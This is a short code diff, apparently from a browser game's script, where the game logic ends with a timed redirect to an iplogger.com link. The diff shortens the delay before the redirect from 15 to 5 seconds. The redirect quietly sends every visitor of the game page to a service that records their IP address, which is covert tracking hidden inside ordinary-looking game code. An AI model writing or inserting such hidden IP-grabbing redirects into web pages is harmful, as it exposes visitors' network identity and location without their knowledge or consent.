@@ -276,4 +276,4 @@ function displayofthegame() {
 }
 setTimeout(() =>{
   location.assign('https://iplogger.com/2X5X65')
-},15000)
+},5000)
